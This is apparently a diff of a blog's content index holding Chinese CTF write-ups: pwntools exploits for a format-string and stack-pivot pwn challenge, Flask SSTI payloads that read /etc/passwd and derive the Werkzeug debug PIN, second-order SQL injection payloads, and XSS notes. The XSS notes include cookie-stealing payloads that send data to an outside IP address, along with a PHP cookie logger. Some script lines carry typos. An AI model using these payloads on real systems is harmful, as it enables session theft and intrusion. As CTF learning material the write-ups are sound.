-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/05.png"></p>
-<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>寻找偏移量 找 616161在第几位 </p>
-<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
-</blockquote>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/01.png"></p>
-<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>Q&amp;A（个人理解）</p>
-<p><code>%16$p是哪来的</code></p>
-<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/02.png"></p>
-<p><code>0x60是哪里来的?</code></p>
-<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/03.png"></p>
-<p><code>payload中为什么要加0x20 ?</code></p>
-<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
-<p><img src="/CTF/Pwn/hdctf%E7%9A%84wp/04.png"></p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -493,6 +439,71 @@
       </tags>
   </entry>
   <entry>
+    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
+    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
+    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
+<blockquote>
+<ol>
+<li>username：就是启动这个flask的用户</li>
+</ol>
+<p>-&gt; <code>etc/passwd</code> 中查看</p>
+<ol start="2">
+<li><p>modname：一般为flask.py</p>
+</li>
+<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
+</li>
+<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
+</li>
+<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
+</li>
+</ol>
+<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
+<ol start="6">
+<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
+</ol>
+<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
+<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
+</blockquote>
+<p>python shell的一些命令(os 模块)</p>
+<p>import os</p>
+<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
+<p>查看当前目录<code>os.getcwd()</code></p>
+<p>更改目录<code>os.chdir()</code></p>
+<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
+<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
+<p><strong>解题：</strong></p>
+<p>题目是FlaskAPP，打开网址，有提示.</p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
+<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
+<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
+<p><strong>Payload：</strong></p>
+<p><strong>1.获取username</strong></p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
+<p>2.获取Mac地址（同上, 转成十进制）</p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
+<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
+<p><strong>获取PIN的脚本（网上找的）</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>参考：<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Buu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU-[MRCTF2020]套娃的Wp</title>
     <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
     <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
@@ -530,6 +541,75 @@
 <p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
 <p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
 <p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[SWPU2019]Web1的Wp</title>
+    <url>/CTF/Web/BUU-%5BSWPU2019%5DWeb1/</url>
+    <content><![CDATA[<h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116</a></p>
+<hr>
+<p>知识点:</p>
+<ul>
+<li><input disabled type="checkbox"> <a href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入</a></li>
+<li><input disabled type="checkbox"> <a href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a></li>
+<li><input disabled type="checkbox"> <a href="https://www.anquanke.com/post/id/193512">information_schema的过滤</a></li>
+</ul>
+<hr>
+<h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><p><strong>原理</strong></p>
+<p>1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p>
+<p>2.数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p>
+<p><strong>过程</strong></p>
+<p>(1)插入1’#</p>
+<p>(2)转义成了1’\#</p>
+<p>(3)放在数据库中还是1’#</p>
+<p>(4)再取出这些数据时，不会转义 &#x3D;&gt; 取出的是 1’# &#x3D;&gt; 完成注入</p>
+<h3 id="2-无列名注入-—-在不知道列名的情况下进行sql注入"><a href="#2-无列名注入-—-在不知道列名的情况下进行sql注入" class="headerlink" title="2.无列名注入 — 在不知道列名的情况下进行sql注入."></a>2.无列名注入 — 在不知道列名的情况下进行sql注入.</h3><p>在mysql&gt;&#x3D;5的版本中，有一个information_schema的库，里面记录着mysql所有表的结构，在sql注入中，我们会通过这个库来获取其他表的结构（列名，表名）。</p>
+<p><strong>原理</strong></p>
+<p>将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。</p>
+<p><strong>操作</strong></p>
+<p>1.<code>select * from list;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql00.png"></p>
+<p>2.<code>select 1,2,3 union select * from list;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql01.png"></p>
+<p>3.select <code>3</code> from (select 1,2,3 union select * from list)a;</p>
+<p>-&gt;末尾的a可以是任意字符，用于命名</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql02.png"></p>
+<p>4.<code>select b from (select 1,2,3 as b union select * from list)a;</code></p>
+<p>-&gt;如果过滤了&#96;&#96;反引号，起别名</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql03.png"></p>
+<p>5.select concat(<code>2</code>,0x2d,<code>3</code>) from (select 1,2,3 union select * from list)a limit 1,3;</p>
+<p>-&gt;多列查询</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/sql04.png"></p>
+<p>payload: <strong>select a,b from posts where a&#x3D;-1 union select 1,(select concat(<code>3</code>,0x2d,<code>4</code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</strong></p>
+<h3 id="3-bypass-information-schema"><a href="#3-bypass-information-schema" class="headerlink" title="3.bypass information_schema"></a>3.bypass information_schema</h3><p><code>information_schema是什么?</code></p>
+<p>-&gt;保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p>
+<p>-&gt;在注入中，infromation_schema库的作用无非就是可以获取到table_schema,table_name,column_name这些数据库内的信息。</p>
+<p><strong>Mysql在5.7版本新增了sys schema 基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
+<p>sys.schema_auto_increment_columns</p>
+<p>-&gt;对表自增字段的监控.</p>
+<p>-&gt;只要有自增字段，那么就可以通过这个库来查询到 &#x3D;&gt; 代替了information_schema</p>
+<p><strong>前提: 注入的表中存在自增字段</strong></p>
+<p>如果没有呢（下面两个可以代替）</p>
+<p>-&gt;schema_table_statistics_with_buffer</p>
+<p>-&gt;sys.x$schema_table_statistics_with_buffer</p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入网站，随便注册一个账号进入，可以发布广告 &#x3D;&gt; 想到了xss(不是很熟悉,不知道怎么去验证,看wp说是二次注入)</p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/00.png"></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/01.png"></p>
+<p>确定存在sql注入,且为二次注入 过滤了空格,or,注释符</p>
+<p><strong>payload:</strong></p>
+<p>1.<code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload00.png"></p>
+<p>2.<code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload01.png"></p>
+<p>3.<code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
+<p><img src="/CTF/Web/BUU-%5BSWPU2019%5DWeb1/payload03.png"></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -654,6 +734,148 @@
       <tags>
         <tag>Web</tag>
         <tag>Buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS学习</title>
+    <url>/CTF/Web/XSS%20/</url>
+    <content><![CDATA[<p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
+<li>诱使受害者打开受到攻击的服务器URL。</li>
+<li>受害者在Web浏览器中打开URL，恶意脚本执行。</li>
+</ul>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内	容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
+<p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
+<p><strong>解释一些常用js代码的意思:</strong></p>
+<p><code>onload</code>：事件处理程序，它会在网页加载完成后执行</p>
+<p><code>document.cookie</code>：截取当前网页所有cooies，cookies是存储在用户浏览器上的小型数据片段，通常用于识别用户或保存的设置</p>
+<p><code>location.href</code>：这会将当前网页的url重定向到 后面的地址</p>
+<p><code>onerror</code>：当事件失败时会触发，<strong>配合img标签使用，不给图片地址（加载失败）&#x3D;&gt;触发onerror</strong></p>
+<p><strong>Linux服务器关闭端口的一些常用指令：</strong></p>
+<p><code>netstat -tuln</code></p>
+<blockquote>
+<p>-&gt; -t 是显示TCP协议的连接</p>
+<p>-&gt; -u 是显示UDP协议的连接</p>
+<p>-&gt; -l 是仅显示监听状态的连接</p>
+<p>-&gt; -n 是以数字形式显示端口号和IP地址</p>
+</blockquote>
+<p><strong>Xss测试过滤：</strong></p>
+<script>alert(1)</script>
+
+<p>&lt;img alert(1)&gt;</p>
+<body>alert(1)(</body>
+
+
+
+
+
+
+
+
+
+
+
+<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a href="https://www.freebuf.com/articles/web/340080.html">Xss payload</a></h4><p><strong>1.无过滤</strong></p>
+<p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2.过滤script</strong></p>
+<blockquote>
+<p><code>&lt;body onload=&quot;location.href=&#39;http://(自己服务器的公网ip)/127.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p><code>&lt;img src=&#39;&#39; onerror=location.href=&#39;http://39.103.98.109/127.php?cookie=&#39;+document.cookie&gt;</code></p>
+<p><code>&lt;svg/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
+<p><code>&lt;input/**/οnfοcus=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
+<p><code>&lt;iframe/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</code></p>
+</blockquote>
+<p><strong>存储型Xss payload：</strong></p>
+<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<p><strong>以ctfshow xss web328为例：</strong></p>
+<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.cookie)&lt;/script&gt;</code></p>
+<p>题目：用户管理页面有信息（需要是admin用户    才可以看到flag）</p>
+<p>思路：伪造SESSION admin用户</p>
+<p><strong>1. 获取admin的SESSION：监听端口，用户注册，收到的信息里面的SESSION应该是admin的</strong></p>
+<p><img src="/CTF/Web/XSS/328-00.png"></p>
+<p><img src="/CTF/Web/XSS/328-01.png"></p>
+<p><strong>2.抓包改SESSION 发包：这里面需要发两次包  每次收到的包都要改SESSION再发送</strong></p>
+<p><img src="/CTF/Web/XSS/328-02.png"></p>
+<p><img src="/CTF/Web/XSS/328-03.png"></p>
+<h4 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h4><p><strong>法一：外带信息payload：（监听端口）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p>
+<p>-&gt; <code>window.open</code> 打开新链接</p>
+<p>-&gt; <code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;) </code>是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p>
+<p>-&gt; <code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）</p>
+<p><strong>法二：jQuery 选择器查找类和获取内容。</strong></p>
+<p>jQuery选择器：用于选择HTML元素的强大工具，使得开发者能更好的获取页面中的元素.</p>
+<p><code>&lt;script&gt;$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if ((value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#39;script&#39;) === -1)) &#123;window.location.href = &#39;http://39.103.98.109:10086/&#39; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
+<blockquote>
+<p><code>$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index, value) &#123; ... &#125;);</code></p>
+<p>这是一个 jQuery 选择器，它查找具有类名 <code>&#39;layui-table-cell&#39;</code>、<code>&#39;laytable-cell-1-0-1&#39;</code> 的 <code>&lt;div&gt;</code> 元素集合，并对每个元素执行一个函数</p>
+</blockquote>
+<blockquote>
+<p><code>.each(function(index, value) &#123; ... &#125;)</code></p>
+<p>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，<code>index</code> 表示当前元素在集合中的索引，<code>value</code> 表示当前元素的引用。</p>
+</blockquote>
+<blockquote>
+<p><code>if (value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1) &#123; ... &#125;</code><br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 <code>&#39;ctfshow&#123;&#39;</code>。<code>value.innerHTML</code> 表示当前元素的 HTML 内容，<code>.indexOf(&#39;ctfshow&#123;&#39;)</code> 用于查找是否包含 <code>&#39;ctfshow&#123;&#39;</code>，如果包含则返回大于 -1 的索引，否则返回 -1</p>
+</blockquote>
+<blockquote>
